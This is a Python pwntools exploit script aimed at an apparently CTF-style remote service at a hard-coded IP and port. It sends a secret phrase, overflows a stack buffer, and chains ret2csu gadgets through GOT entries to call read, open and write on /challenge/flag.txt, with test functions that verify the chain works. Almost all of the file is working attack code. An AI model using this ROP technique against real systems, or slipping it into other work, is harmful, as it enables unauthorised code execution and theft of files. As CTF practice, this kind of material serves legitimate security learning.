#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

HOST = '154.57.164.77'
PORT = 32702

csu_pop = 0x401512
csu_call = 0x4014f8
pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519
ret = 0x401016
got_read = 0x403250
got_write = 0x403230
got_open = 0x403278
bss_path = 0x404000  # use lower BSS that's unused
bss_data = 0x404100

def test_write_after_open():
    """Verify: CSU read(path) + CSU open(path) + CSU write(1, bss_path, 20)"""
    r = remote(HOST, PORT)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year: ')

    pay = b'A' * 72
    # 1) read path into bss_path
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_path) + p64(40) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 2) open(bss_path, 0, 0)
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(bss_path) + p64(0) + p64(0) + p64(got_open)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 3) write(1, bss_path, 20) — echo path back (proves we're alive after open)
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(1) + p64(bss_path) + p64(20) + p64(got_write)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 4) read(0=stdin, bss_data, 32) — read marker from stdin
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_data) + p64(32) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 5) write(1, bss_data, 32) — output marker
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(1) + p64(bss_data) + p64(32) + p64(got_write)
    pay += p64(csu_call) + p64(0) + p64(0)*6

    r.send(pay)
    import time; time.sleep(0.3)
    r.send(b'/challenge/flag.txt\x00')   # for CSU call 1
    time.sleep(0.3)
    r.send(b'IM_ALIVE_AFTER_OPEN!')       # for CSU call 4
    time.sleep(1)
    try:
        data = r.recv(timeout=4)
        lines = data.split(b'\n')
        for i, l in enumerate(lines):
            print(f'  line[{i}]: {l[:80]}')
        if b'IM_ALIVE' in data:
            print('  → 4 CSU calls WORK! After open, we are alive!')
            if b'challenge' in data:
                print('  → Path echo works too')
    except Exception as e:
        print(f'Test: {e}')
    r.close()

def test_only_write_after_open():
    """After open, just write, then exit (no more CSU calls)."""
    r = remote(HOST, PORT)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year: ')

    pay = b'A' * 72
    # 1) read path
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_path) + p64(40) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 2) open
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(bss_path) + p64(0) + p64(0) + p64(got_open)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 3) write(1, bss_path, 20)
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(1) + p64(bss_path) + p64(20) + p64(got_write)
    pay += p64(csu_call) + p64(0) + p64(0)*6

    r.send(pay)
    import time; time.sleep(0.3)
    r.send(b'/challenge/flag.txt\x00')
    time.sleep(1)
    try:
        data = r.recv(timeout=4)
        print(f'write_after_open: {data[:200]}')
        if b'challenge' in data and b'flag' in data:
            print('  → Path printed after open!')
    except Exception as e:
        print(f'write_after_open: {e}')
    r.close()

if __name__ == '__main__':
    print('=== Write after open test ===')
    test_only_write_after_open()
    print()
    print('=== 4 CSU calls (write after open, read marker, write marker) ===')
    test_write_after_open()
